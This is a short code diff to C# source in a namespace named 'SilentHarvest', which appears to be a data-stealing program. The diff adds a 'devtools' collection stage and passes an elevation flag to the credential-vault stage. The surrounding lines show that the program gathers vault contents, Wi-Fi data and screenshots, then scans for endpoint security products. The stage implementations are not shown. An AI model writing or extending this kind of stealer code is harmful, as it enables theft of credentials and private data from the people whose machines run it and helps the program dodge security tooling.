@@ -66,6 +66,7 @@ namespace SilentHarvest
             bool wantVault = only == null || only.Contains("vault");
             bool wantWifi = only == null || only.Contains("wifi");
             bool wantShot = only == null || only.Contains("shot");
+            bool wantDevt = only == null || only.Contains("devt");
 
             if (wantReg)
             {
@@ -93,7 +94,7 @@ namespace SilentHarvest
             }
             if (wantVault)
             {
-                string s = Stages.VaultStage(parts);
+                string s = Stages.VaultStage(parts, elevated);
                 Util.Log("vault stage: {0}", s);
             }
             if (wantWifi)
@@ -109,6 +110,11 @@ namespace SilentHarvest
                     parts.Add(new Part("win:screenshot.png", png, null));
                     Util.Log("screenshot: {0} bytes", png.Length);
                 }
+            }
+            if (wantDevt)
+            {
+                string s2 = Stages.DevToolsStage(parts);
+                Util.Log("devtools stage: {0}", s2);
             }
             Stages.EdrScan(parts);
 
